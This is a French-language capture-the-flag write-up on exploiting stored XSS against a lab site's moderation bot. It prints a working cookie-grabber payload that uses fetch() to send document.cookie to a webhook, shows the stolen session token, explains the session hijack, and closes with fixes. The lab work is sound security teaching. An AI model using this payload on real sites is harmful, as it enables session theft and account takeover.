## Vulnerabilite : A03 Injection / Cross Site Scripting (XSS)

Definition : 

## Processus de decouverte : 

Dans le code source des articles, on retrouve cet indice : 

![image](../../../utils/A03/assets/hint.png)
*+ "HTML is supported for formatting", rien ne garantit qu'un utilisateur ne se serve du HTML seulement pour formatter, la preuve*


On nous dit egalement, que le bot de moderation passe "within a minute" => `Every new post is opened by our automated moderation bot for review, usually within a minute.`

On peut donc se dire qu'il est possible de recuperer les informations de session du bot de moderation, et plus particulierement son cookie pour pouvoir se connecter en tant que bot de moderation.

L'idee du cookie grabber provient de la source 1 :
- [Source1:](https://owasp.org/www-community/attacks/xss/)
- [Source2:](https://portswigger.net/web-security/cross-site-scripting/stored)

![image](../../../utils/A03/assets/source.png)

On va donc reproduire la commande, en JS pour le coup. On va utiliser une addresse URL unique via [Webhook](https://webhook.site).

Notre script : 

```js
<script>fetch("<url_webhook>?c=" + encodeURIComponent(document.cookie));</script>
```

Ce qu'il va se passer : 

1. Le bot de moderation va ouvrir le commentaire contenant notre `<script>`
2. Le navigateur du bot va ouvrir le HTML et executer le JS
3. `document.cookie` va recuperer les cookies accessibles au JavaScript de la page
4. `fetch()` effectue alors une requete HTTP vers le webhook, avec les cookies recuperes dans le parametre `c`.

Resultat : 

![image](../../../utils/A03/assets/webhooksite.png)

```json
{
    "cookie": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ4eHYxYnR2dHpheGVuNWgiLCJsb2dpbiI6Im1vZGVyYXRvciIsInJvbGUiOiJzdHVkZW50IiwiZXhwIjoxNzg4MTkzMzY5fQ.uJtvrsNyPEQQkLwjBW9NPcL4XswjrlRzKmejNwjP4Mo",
    "flag": "FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}"
}

```

Le faille se situe dans le fait de pouvoir executer du code dans un contexte qui ne devrait pas etre accessible et qui nous permet de faire de l'exfiltration. 

Ensuite : `DevTools -> Application -> Cookies`, on remplace le cookie de la session actuelle par celui renvoye avec le flag sur notre WebHook et on se connecte en tant que ModBot : 

![image](../../../utils/A03/assets/modbot.png)

**Comment patcher ?**

1. Commencer par encoder les entrees utilisateur et traiter les entrees comme du texte et pas du code interpretable. Finito le HTML.
2. Rendre le cookie `HttpOnly` afin d'empecher sa lecture par JavaScript. 